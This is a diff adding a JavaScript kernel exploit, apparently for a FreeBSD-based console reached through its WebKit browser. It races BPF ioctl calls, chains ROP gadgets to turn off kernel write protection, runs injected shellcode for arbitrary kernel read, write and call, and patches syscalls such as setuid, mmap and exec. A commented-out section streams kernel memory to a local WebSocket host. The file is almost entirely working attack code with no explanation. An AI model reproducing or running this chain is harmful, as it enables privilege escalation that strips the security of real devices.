@@ -1,0 +1,651 @@
+function kernexploit() {
+    document.body.removeChild(document.getElementById("kcent"))
+    log("--- trying kernel exploit --");
+    function malloc(sz) {
+        var backing = new Uint8Array(0x10000+sz);
+        window.nogc.push(backing);
+        var ptr = p.read8(p.leakval(backing).add32(0x10));
+        ptr.backing = backing;
+        return ptr;
+    }
+    function malloc32(sz) {
+        var backing = new Uint8Array(0x10000+sz*4);
+        window.nogc.push(backing);
+        var ptr = p.read8(p.leakval(backing).add32(0x10));
+        ptr.backing = new Uint32Array(backing.buffer);
+        return ptr;
+    }
+    var strcpy_helper = new Uint8Array(0x1000);
+    var where_writeptr_strcpy = p.leakval(strcpy_helper).add32(0x10);
+    function strcpy(ptr, str) {
+        p.write8(where_writeptr_strcpy, ptr);
+        for (var i = 0; i < str.length; i++)
+            strcpy_helper[i] = str.charCodeAt(i) & 0xFF;
+        strcpy_helper[str.length] = 0;
+    }
+    var fd = p.syscall("open", p.sptr("/dev/bpf0"), 2).low;
+    var fd1 = p.syscall("open", p.sptr("/dev/bpf0"), 2).low;
+    if (fd == (-1 >>> 0)) {
+        print("kexp failed: no bpf0");
+    }
+    
+    var assertcnt = 0;
+    var assert = function(x) {
+        assertcnt++;
+        if (!x) throw "assertion " + assertcnt + " failed";
+    }
+    
+    //print("got it");
+    
+    var bpf_valid = malloc32(0x4000);
+    var bpf_spray = malloc32(0x4000);
+    var bpf_valid_u32 = bpf_valid.backing;
+    var bpf_valid_prog = malloc(0x40);
+    p.write8(bpf_valid_prog, 0x800/8)
+    p.write8(bpf_valid_prog.add32(8), bpf_valid)
+    var bpf_spray_prog = malloc(0x40);
+    p.write8(bpf_spray_prog, 0x800/8)
+    p.write8(bpf_spray_prog.add32(8), bpf_spray)
+    
+    for (var i = 0 ; i < 0x400; ) {
+        bpf_valid_u32[i++] = 6; // BPF_RET
+        bpf_valid_u32[i++] = 0;
+    }
+
+    var rtv = p.syscall("ioctl", fd, 0x8010427B, bpf_valid_prog);
+    assert(rtv.low == 0);
+
+    //print("okay")
+    
+    var spawnthread = function(name, chain) {
+        
+        /*
+         
+         
+         seg000:00000000007FA7D0                         sub_7FA7D0      proc near               ; DATA XREF: sub_7F8330+5Eo
+         seg000:00000000007FA7D0 55                                      push    rbp
+         seg000:00000000007FA7D1 48 89 E5                                mov     rbp, rsp
+         seg000:00000000007FA7D4 41 56                                   push    r14
+         seg000:00000000007FA7D6 53                                      push    rbx
+         seg000:00000000007FA7D7 48 89 F3                                mov     rbx, rsi
+         seg000:00000000007FA7DA 49 89 FE                                mov     r14, rdi
+         seg000:00000000007FA7DD 48 8D 35 E5 B3 EC 00                    lea     rsi, aMissingPlteBef ; "Missing PLTE before tRNS"
+         
+         
+         -> xref:
+         
+         
+         seg000:00000000007F8380 48 8D 3D 28 D8 EC 00                    lea     rdi, a1_5_18_0  ; "1.5.18"
+         seg000:00000000007F8387 48 8D 15 82 23 00 00                    lea     rdx, sub_7FA710
+         seg000:00000000007F838E 48 8D 0D 3B 24 00 00                    lea     rcx, sub_7FA7D0
+         seg000:00000000007F8395 31 F6                                   xor     esi, esi
+         seg000:00000000007F8397 49 C7 47 20 00 00 00 00                 mov     qword ptr [r15+20h], 0
+         seg000:00000000007F839F 66 41 C7 47 18 00 00                    mov     word ptr [r15+18h], 0
+         seg000:00000000007F83A6 49 C7 47 10 00 00 00 00                 mov     qword ptr [r15+10h], 0
+         seg000:00000000007F83AE E8 8D 3C D3 00                          call    sub_152C040
+         
+         -> code:
+         
+         m_png = png_create_read_struct(PNG_LIBPNG_VER_STRING, 0, decodingFailed, decodingWarning);
+         
+         
+         decodingWarning -> contains Missing PLTE before tRNS
+         
+         decodingFailed -> contains longjmp
+         
+         seg000:00000000007FA710                         sub_7FA710      proc near               ; DATA XREF: sub_7F8330+57o
+         seg000:00000000007FA710                                                                 ; sub_7F9DC0+2Eo
+         seg000:00000000007FA710 55                                      push    rbp
+         seg000:00000000007FA711 48 89 E5                                mov     rbp, rsp
+         seg000:00000000007FA714 48 8B 35 5D B6 E5 02                    mov     rsi, cs:qword_3655D78
+         seg000:00000000007FA71B BA 60 00 00 00                          mov     edx, 60h ; '`'
+         seg000:00000000007FA720 E8 AB E6 D2 00                          call    sub_1528DD0
+         seg000:00000000007FA725 BE 01 00 00 00                          mov     esi, 1
+         seg000:00000000007FA72A 48 89 C7                                mov     rdi, rax
+         seg000:00000000007FA72D E8 26 6D 80 FF                          call    sub_1458 < longjmp
+         seg000:00000000007FA732 0F 0B                                   ud2
+         seg000:00000000007FA732                         sub_7FA710      endp
+         
+         
+         */
+        var longjmp = window.webKitBase.add32(0x14e8);
+        
+        // ThreadIdentifier createThread(ThreadFunction entryPoint, void* data, const char* name)
+        /*
+         seg000:00000000001DD17F 48 8D 15 C9 38 4C 01                    lea     rdx, aWebcoreGccontr ; "WebCore: GCController"
+         seg000:00000000001DD186 31 F6                                   xor     esi, esi
+         seg000:00000000001DD188 E8 B3 1B F9 00                          call    sub_116ED40
+         */
+        
+        var createThread = window.webKitBase.add32(0x779190);
+        
+        var contextp = malloc32(0x2000);
+        var contextz = contextp.backing;
+        contextz[0] = 1337;
+        
+        var thread2 = new RopChain();
+        thread2.push(window.gadgets["ret"]); // nop
+        thread2.push(window.gadgets["ret"]); // nop
+        thread2.push(window.gadgets["ret"]); // nop
+        thread2.push(window.gadgets["ret"]); // nop
+        chain(thread2);
+        
+        p.write8(contextp, window.gadgets["ret"]); // rip -> ret gadget
+        p.write8(contextp.add32(0x10), thread2.ropframeptr); // rsp
+        
+        var retv = function() {p.fcall(createThread, longjmp, contextp, p.sptr(name));}
+        
+        window.nogc.push(contextp);
+        window.nogc.push(thread2);
+        
+        return retv;
+    }
+
+    var interrupt1, loop1;
+    var interrupt2, loop2;
+    var sock = p.syscall(97, 2, 2)
+    var kscratch = malloc32(0x100);
+
+    var start1 = spawnthread("GottaGoFast", function (thread2) {
+        interrupt1 = thread2.ropframeptr;
+        thread2.push(window.gadgets["ret"]); // pop rdx
+        thread2.push(window.gadgets["ret"]); // pop rdx
+        thread2.push(window.gadgets["ret"]); // pop rdx
+
+        thread2.push(window.gadgets["pop rdi"]); // pop rdi
+        thread2.push(fd); // what
+        thread2.push(window.gadgets["pop rsi"]); // pop rsi
+        thread2.push(0x8010427B); // what
+        thread2.push(window.gadgets["pop rdx"]); // pop rdx
+        thread2.push(bpf_valid_prog); // what
+        thread2.push(window.gadgets["pop rsp"]); // pop rdx
+        thread2.push(thread2.ropframeptr.add32(0x800)); // what
+        thread2.count = 0x100;
+        var cntr = thread2.count;
+        thread2.push(window.syscalls[54]); // ioctl
+        thread2.push_write8(thread2.ropframeptr.add32(cntr * 8), window.syscalls[54]); // restore ioctl
+
+        thread2.push(window.gadgets["pop rdi"]); // pop rdi
+        var wherep = thread2.pushSymbolic(); // where
+        thread2.push(window.gadgets["pop rsi"]); // pop rsi
+        var whatp = thread2.pushSymbolic(); // where
+        thread2.push(window.gadgets["mov [rdi], rsi"]); // perform write
+
+        thread2.push(window.gadgets["pop rsp"]); // pop rdx
+
+        loop1 = thread2.ropframeptr.add32(thread2.count * 8);
+        thread2.push(0x41414141); // what
+
+        thread2.finalizeSymbolic(wherep, loop1);
+        thread2.finalizeSymbolic(whatp, loop1.sub32(8));
+
+    });
+
+    var krop = new RopChain();
+    var race = new RopChain();
+    var ctxp = malloc32(0x2000);
+    var ctxp1 = malloc32(0x2000);
+
+    p.write8(bpf_spray.add32(16), ctxp);
+
+    var prefaultlist = [];
+    function pfd(addr) {
+        var page = addr.add32(0);
+        page.low &= 0xffffc000;
+        p.syscall("mlock", page, 0x8000);
+        p.read4(addr);
+        return addr;
+    }
+    function pf(addr) {
+        var page = addr.add32(0);
+        page.low &= 0xffffc000;
+        p.syscall("mlock", page, 0x8000);
+        var ret = addr.add32(0);
+        while (1) {
+            var opcode = (p.read4(ret) & 0xff);
+            if (opcode == 0xc3) {
+                prefaultlist.push(ret);
+                break;
+            }
+            ret.add32inplace(1);
+        }
+        return addr;
+    }
+    for (var gadgetname in gadgets) {
+        if (gadgets.hasOwnProperty(gadgetname)) {
+            if (gadgetname == "stack_chk_fail" || gadgetname == "memset" || gadgetname == "setjmp") continue;
+            pf(gadgets[gadgetname]);
+        }
+    }
+/*
+ 67d27:    48 8b 07                 mov    (%rdi),%rax
+ 67d2a:    ff 50 58                 callq  *0x58(%rax)
+
+ 12a184d:    48 83 ec 58              sub    $0x58,%rsp
+ 12a1851:    89 55 d4                 mov    %edx,-0x2c(%rbp)
+ 12a1854:    49 89 fd                 mov    %rdi,%r13
+ 12a1857:    49 89 f7                 mov    %rsi,%r15
+ 12a185a:    49 8b 45 00              mov    0x0(%r13),%rax
+ 12a185e:    ff 90 d0 07 00 00        callq  *0x7d0(%rax)
+
+ 6ef2e5:    48 8b 7f 10              mov    0x10(%rdi),%rdi
+ 6ef2e9:    ff 20                    jmpq   *(%rax)
+
+ 2728a1:    48 8d 7d d8              lea    -0x28(%rbp),%rdi
+ 2728a5:    ff 50 40                 callq  *0x40(%rax)
+ 
+ 12846b4:    48 8b 77 08              mov    0x8(%rdi),%rsi
+ 12846b8:    48 8b 7f 18              mov    0x18(%rdi),%rdi
+ 12846bc:    48 8b 07                 mov    (%rdi),%rax
+ 12846bf:    ff 50 30                 callq  *0x30(%rax)
+
+ 15ca29b:    48 8b 97 b0 00 00 00     mov    0xb0(%rdi),%rdx
+ 15ca2a2:    ff 57 70                 callq  *0x70(%rdi)
+
+ f094a:    48 89 e5                 mov    %rsp,%rbp
+ f094d:    48 8b 07                 mov    (%rdi),%rax
+ f0950:    ff 90 20 04 00 00        callq  *0x420(%rax)
+*/
+    var ctxp2 = malloc32(0x2000);
+
+    var wk2apf = function(off) {
+        var addr = window.webKitBase.add32(off);
+        pf(addr);
+        return addr;
+    }
+
+    p.write8(ctxp.add32(0x50), 0);
+    p.write8(ctxp.add32(0x68), ctxp1);
+    var stackshift_from_retaddr = 0;
+    p.write8(ctxp1.add32(0x10), wk2apf(0x12a184d));
+    stackshift_from_retaddr += 8 + 0x58; // call + sub
+    p.write8(ctxp.add32(0), ctxp2);
+    p.write8(ctxp.add32(0x10), ctxp2.add32(8));
+
+    p.write8(ctxp2.add32(0x7d0), wk2apf(0x6ef2e5))
+
+    // rax = ctxp2, rdi = ctxp2 + 8
+    var iterbase = ctxp2;
+    
+    for (var i = 0; i < 0xf; i++) {
+        p.write8(iterbase, wk2apf(0x12a184d))
+        stackshift_from_retaddr += 8 + 0x58; // call + sub
+        // rax = ctxp2+0x20
+        p.write8(iterbase.add32(0x7d0+0x20), wk2apf(0x6ef2e5))
+        p.write8(iterbase.add32(8), iterbase.add32(0x20));
+        p.write8(iterbase.add32(0x18), iterbase.add32(0x20+8))
+        iterbase = iterbase.add32(0x20);
+    }
+
+    var raxbase = iterbase;
+    var rdibase = iterbase.add32(8);
+    var memcpy = get_jmptgt(webKitBase.add32(0xf8));
+    memcpy = p.read8(memcpy);
+    pf(memcpy);
+    
+    p.write8(raxbase, wk2apf(0x15ca29b))
+    stackshift_from_retaddr += 8; // call + sub
+    p.write8(rdibase.add32(0x70), wk2apf(0x12846b4)); // next gadget
+    stackshift_from_retaddr += 8; // call + sub
+    p.write8(rdibase.add32(0x18), rdibase); // rdi
+    p.write8(rdibase.add32(8), krop.ropframeptr); // rax
+    p.write8(raxbase.add32(0x30), wk2apf(0xf094a)); // next gadget
+    p.write8(rdibase, raxbase);
+    p.write8(raxbase.add32(0x420), wk2apf(0x2728a1)); // next gadget
+    p.write8(raxbase.add32(0x40), memcpy.add32(0xc2-0x90)); // next gadget (memcpy skipping prolog)
+    var topofchain = stackshift_from_retaddr + 0x28 ;
+    p.write8(rdibase.add32(0xb0), topofchain); // rdx
+    for (var i = 0; i < 0x1000/8; i++) {
+        p.write8(krop.ropframeptr.add32(i*8), window.gadgets["ret"]);
+    }
+    krop.count = 0x10;
+    /*
+     f094a:    48 89 e5                 mov    %rsp,%rbp
+     f094d:    48 8b 07                 mov    (%rdi),%rax
+     f0950:    ff 90 20 04 00 00        callq  *0x420(%rax)
+     
+     2728a1:    48 8d 7d d8              lea    -0x28(%rbp),%rdi
+     2728a5:    ff 50 40                 callq  *0x40(%rax)
+     
+     55566f:    48 01 c7                 add    %rax,%rdi
+     555672:    48 89 f8                 mov    %rdi,%rax
+     555675:    c3                       retq
+     
+     46ef9:    48 8b 07                 mov    (%rdi),%rax
+     46efc:    c3                       retq
+     
+     1520c6:    48 01 f0                 add    %rsi,%rax
+     1520c9:    c3                       retq
+     
+     14536b:    48 89 07                 mov    %rax,(%rdi)
+     14536e:    c3                       retq
+     
+     1570a1f:    48 21 f0                 and    %rsi,%rax
+     1570a22:    c3                       retq
+     
+     353a71:    48 89 c2                 mov    %rax,%rdx
+     353a74:    c3                       retq
+     
+     1cee60:    48 89 d0                 mov    %rdx,%rax
+     1cee63:    c3                       retq
+     
+     15a3faf:    48 89 c7                 mov    %rax,%rdi
+     15a3fb2:    c3                       retq
+     
+     6c83a:    48 8b 00                 mov    (%rax),%rax
+     6c83d:    c3                       retq
+     
+     295dbe:    ff e7                    jmpq   *%rdi
+
+     */
+    p.write8(kscratch.add32(0x420), window.gadgets["pop rdi"]);
+    p.write8(kscratch.add32(0x40), window.gadgets["pop rax"]);
+    p.write8(kscratch.add32(0x18), kscratch);
+
+    function set_rdi_rbpoff() {
+        krop.push(window.gadgets["pop rdi"]); // pop rdi
+        krop.push(kscratch.add32(0x18)); // what
+    
+        krop.push(wk2apf(0xf094a)); // rbp = rsp
+        var rbp_off = topofchain - krop.count*8 + 0x28;
+        krop.push(wk2apf(0x2728a1)); // rbp = rsp
+        return rbp_off;
+    }
+    
+    function add_to_rdi(imm) {
+        krop.push(window.gadgets["pop rax"]); // pop rdi
+        krop.push(imm); // what
+        krop.push(wk2apf(0x55566f)); // rbp = rsp
+
+    }
+    
+    var rboff = set_rdi_rbpoff();
+    add_to_rdi(rboff);
+    
+    var add_rax = function(imm) {
+        krop.push(window.gadgets["pop rsi"]); // pop rsi
+        krop.push(imm); // what
+        krop.push(wk2apf(0x1520c6)); // add rsi to rax
+    }
+
+    
+    krop.push(wk2apf(0x46ef9)); // deref rdi in rax
+    add_rax(0x2fa); // what
+    krop.push(wk2apf(0x14536b)); // write rax to rdi
+
+    var shellbuf = malloc32(0x1000);
+    
+    var write_rax = function(addr) {
+        krop.push(window.gadgets["pop rdi"]); // pop rdi
+        krop.push(addr); // what
+        krop.push(wk2apf(0x14536b)); // write rax to rdi
+    }
+    
+    var load_rax = function(addr) {
+        krop.push(window.gadgets["pop rax"]); // pop rax
+        krop.push(addr); // what
+        krop.push(wk2apf(0x6c83a)); // deref rax
+    }
+    
+    var and_rax = function(imm) {
+        krop.push(window.gadgets["pop rsi"]); // pop rdi
+        krop.push(imm); // what
+        krop.push(wk2apf(0x1570a1f)); // and rax to rdi
+    }
+    
+    var rax_to_rdx = function() {
+        krop.push(wk2apf(0x353a71)); // rax to rdx
+    }
+    var rdx_to_rax = function() {
+        krop.push(wk2apf(0x1cee60)); // rdx to rax
+    }
+    var rax_to_rdi = function() {
+        krop.push(wk2apf(0x15a3faf)); // rax to rdi
+    }
+    var write_to_rax64 = function(imm) {
+        krop.push(window.gadgets["pop rsi"]); // pop rdi
+        krop.push(imm); // what
+        krop.push(window.gadgets["mov [rax], rsi"]); // pop rdi
+    }
+    write_rax(kscratch); // save address in usermode
+    add_rax(0xc54b4)
+    write_rax(kscratch.add32(8)); // save address
+    krop.push(wk2apf(0x82)); // jmp rax
+    write_rax(kscratch.add32(16)); // save cr0
+    and_rax(new int64(0xfffeffff,0xffffffff)); // unset bit
+    rax_to_rdx();
+    load_rax(kscratch.add32(8))
+    add_rax(9)
+    rax_to_rdi();
+    rdx_to_rax();
+    krop.push(wk2apf(0x295dbe)); // jmp rdi
+    
+    /*
+     Write Anywhere mode
+     */
+
+    // kscratch = 0xFFFFFFFF8236DA5C;
+
+    load_rax(kscratch);
+    add_rax(0x3609a);
+    krop.push(wk2apf(0x6c83a)); // deref rax
+    write_rax(kscratch.add32(0x330)); // rando offset lol
+
+    load_rax(kscratch);
+    add_rax(0x3609a);
+    write_to_rax64(new int64(0x9090FA38,0x90909090)); // patch mprotect
+    
+    load_rax(kscratch);
+    add_rax(0x133c454);
+    write_to_rax64(shellbuf); // patch bpfwrite
+    
+    /*
+     Disable Write Anywhere mode
+     */
+
+    load_rax(kscratch.add32(8))
+    add_rax(9)
+    rax_to_rdi();
+    load_rax(kscratch.add32(16))
+    krop.push(wk2apf(0x295dbe)); // jmp rdi
+
+    krop.push(wk2apf(0x5cdb9));
+    krop.push(kscratch.add32(0x1000));
+
+    pf(window.gadgets.infloop)
+    pfd(ctxp)
+    pfd(kscratch)
+    pfd(ctxp1);
+    pfd(ctxp2);
+    
+    var kev = malloc32(0x100);
+    kev.backing[0] = sock; // ident
+    kev.backing[2] = 0x1ffff; // flags|filter
+    kev.backing[3] = 1; // fflags
+    kev.backing[4] = 5; // data
+
+    start1();
+    while (1) {
+        
+        var kq = p.syscall("kqueue");
+
+        race.count = 0;
+        
+        race.push(window.gadgets["ret"]); // pop rdx
+        race.push(window.gadgets["ret"]); // pop rdx
+        race.push(window.gadgets["ret"]); // pop rdx
+        race.push(window.gadgets["ret"]); // pop rdx
+        for (var i = 0; i < prefaultlist.length; i++) {
+            race.push(prefaultlist[i]);
+        }
+
+        race.push_write8(loop1, interrupt1); // start other thread
+        race.push(window.gadgets["pop rdi"]); // pop rdi
+        race.push(fd); // what
+        race.push(window.gadgets["pop rsi"]); // pop rsi
+        race.push(0x8010427B); // what
+        race.push(window.gadgets["pop rdx"]); // pop rdx
+        race.push(bpf_valid_prog); // what
+        race.push(window.syscalls[54]); // ioctl
+        
+        race.push(window.gadgets["pop rdi"]); // pop rdi
+        race.push(kq); // what
+        race.push(window.gadgets["pop rsi"]); // pop rsi
+        race.push(kev); // what
+        race.push(window.gadgets["pop rdx"]); // pop rdx
+        race.push(1); // what
+        race.push(window.gadgets["pop rcx"]); // pop rdx
+        race.push(0); // what
+        race.push(window.gadgets["pop r8"]); // pop rdx
+        race.push(0); // what
+        race.push(window.syscalls[363]); // pop rdx
+        
+        race.push(window.gadgets["pop rdi"]); // pop rdi
+        race.push(fd1); // what
+        race.push(window.gadgets["pop rsi"]); // pop rsi
+        race.push(0x8010427B); // what
+        race.push(window.gadgets["pop rdx"]); // pop rdx
+        race.push(bpf_spray_prog); // what
+        race.push(window.syscalls[54]); // ioctl
+        
+        race.push(window.gadgets["pop rdi"]); // pop rdi
+        race.push(kq); // what
+        race.push(window.syscalls[6]); // pop rdx
+
+        /*if(start2) {
+            start2();
+            start2=null;
+        }*/
+        iters ++;
+
+        var kr = race.run();
+        var iters = 0
+        if (kscratch.backing[0] != 0) {
+            var kernbase = p.read8(kscratch).sub32(0x16da5c)
+            var origbytes_mprotect = p.read8(kscratch.add32(0x330));
+            
+            log("found kernel base at " + kernbase);
+
+            var shcode = [0x813d8b48,0xff000000,0x801f0f27,0x00000000,0x000013e9,0x001f0f00,0x00002fe9,0x001f0f00,0x000033e9,0x001f0f00,0x48c0200f,0xfeffff25,0xc0220fff,0x08478b48,0x107f8b48,0x0f078948,0x0d48c020,0x00010000,0xc3c0220f,0x08478b48,0x48008b48,0xc3084789,0x08478b48,0x18778b48,0x20578b48,0x284f8b48,0x30478b4c,0x384f8b4c,0x107f8b48,0x8b48d0ff,0x00000b3d,0x47894800,0x0f66c308,0x0000441f,kscratch.low,kscratch.hi];
+            for (var i = 0; i < shcode.length; i++) {
+                shellbuf.backing[i] = shcode[i];
+            }
+            p.syscall("mprotect", shellbuf, 0x4000, 7);
+            pfd(shellbuf);
+
+            p.write8(kscratch, window.gadgets.ret);
+            p.fcall(shellbuf) // prefault
+            
+            var kread64 = function(addr) {
+                p.write8(kscratch, shellbuf.add32(0x18)); // read
+                p.write8(kscratch.add32(0x8), addr);
+                p.syscall("write", fd, shellbuf, 1); // makes kernel jump to shellbuf
+                return p.read8(kscratch.add32(8));
+            }
+            var kwrite64 = function(addr,value) {
+                p.write8(kscratch, shellbuf.add32(0x10)); // write
+                p.write8(kscratch.add32(8), value);
+                p.write8(kscratch.add32(0x10), addr);
+                p.syscall("write", fd, shellbuf, 1); // makes kernel jump to shellbuf
+            }
+            var kfcall = function(addr, rdi, rsi, rdx, rcx, r8, r9) {
+                p.write8(kscratch, shellbuf.add32(0x20)); // fcall
+                p.write8(kscratch.add32(8), addr);
+                if (!rdi) rdi = 0;
+                if (!rsi) rsi = 0;
+                if (!rdx) rdx = 0;
+                if (!rcx) rcx = 0;
+                if (!r8) r8 = 0;
+                if (!r9) r9 = 0;
+                p.write8(kscratch.add32(0x10), rdi);
+                p.write8(kscratch.add32(0x18), rsi);
+                p.write8(kscratch.add32(0x20), rdx);
+                p.write8(kscratch.add32(0x28), rcx);
+                p.write8(kscratch.add32(0x30), r8);
+                p.write8(kscratch.add32(0x38), r9);
+                p.syscall("write", fd, shellbuf, 1); // makes kernel jump to shellbuf
+                return p.read8(kscratch.add32(8));
+            }
+            
+            // unpatch mprotect
+            //kwrite64(kernbase.add32(0x1a3af6), origbytes_mprotect);
+
+            /*
+             * testmode
+            log("reading kbase")
+            log(kread64(kernbase));
+            log("writing kbase = 0x41414141")
+            kwrite64(kernbase, 0x41414141);
+            log("reading kbase")
+            log(kread64(kernbase));
+            log("all done! :)")*/
+
+            // clean up heap
+            var k_malloc = kernbase.add32(0x10e140);
+            var mtp = kernbase.add32(0x14b7320);
+            for (var i = 0; i < 256; i++) {
+                kfcall(k_malloc, 0x800, mtp, 0x102);
+            }
+
+            /*
+             * kdump mode
+            var chunk8 = new Uint8Array(0x10000);
+            var readbuf = p.read8(p.leakval(chunk8).add32(0x10));
+            alert("dumping kernel");
+            connection = new WebSocket('ws://10.17.0.1:8080');
+            connection.binaryType = "arraybuffer";
+            var helo = new Uint32Array(1);
+            helo[0] = 0x41414141;
+            var dumpptr = kernbase.add32(0);
+            connection.onmessage = function() {
+                try {
+                    kfcall(memcpy, readbuf, dumpptr, 0x10000);
+                    dumpptr.add32inplace(0x10000);
+                    connection.send(chunk8);
+                } catch (e) {
+                    print(e);
+                }
+            }*/
+            
+            // enable uart
+            //p.write8(kscratch.add32(0x440), 1);
+            //kfcall(kernbase.add32(0x3952a0), 4, 0x31f, 1, kscratch.add32(0x440));
+
+            // PATCH: sys_setuid
+            var sys_setuid_patch = new int64(0x000000B8, 0xC4894100);
+            kwrite64(kernbase.add32(0x54A72), sys_setuid_patch);
+            print("PATCH: sys_setuid patched!");
+
+            // PATCH: sys_mmap
+            var sys_mmap_patch = new int64(0x37B64037, 0x3145C031);
+            kwrite64(kernbase.add32(0x13D510), sys_mmap_patch);
+            print("PATCH: sys_mmap patched!");
+
+            // PATCH: amd64_syscall
+            var amd64_syscall_patch1 = new int64(0x00000000, 0x40878B49);
+            var amd64_syscall_patch2 = new int64(0x90907DEB, 0x72909090);
+            kwrite64(kernbase.add32(0x493), amd64_syscall_patch1);
+            kwrite64(kernbase.add32(0x4B1), amd64_syscall_patch2);
+            print("PATCH: amd64_syscall patched!");
+
+            // PATH: sys_dynlib_dlsym
+            var sys_dynlib_dlsym_patch1 = new int64(0x000000E9, 0x8B489000);
+            var sys_dynlib_dlsym_patch2 = new int64(0x90C3C031, 0x90909090);
+            kwrite64(kernbase.add32(0x237E2A), sys_dynlib_dlsym_patch1);
+            kwrite64(kernbase.add32(0x2B2350), sys_dynlib_dlsym_patch2);
+            print("PATCH: sys_dynlib_dlsym patched!");
+
+            // PATCH: sys_exec
+            var sys_exec_param = new int64(0, 1);
+            kwrite64(kernbase.add32(0x107C820), 0x02);
+            kwrite64(kernbase.add32(0x107C828), kernbase.add32(0x13460));
+            kwrite64(kernbase.add32(0x107C848), sys_exec_param);
+            print("PATCH: sys_exec enabled!");
+
+            // finished!
+            print("Kernel patched!");
+            return;
+        }
+    }
+}
+document.body.innerHTML += "<center id=kcent><h1><a href=javascript:kernexploit()>run kernel exploit</a></h1></center>"
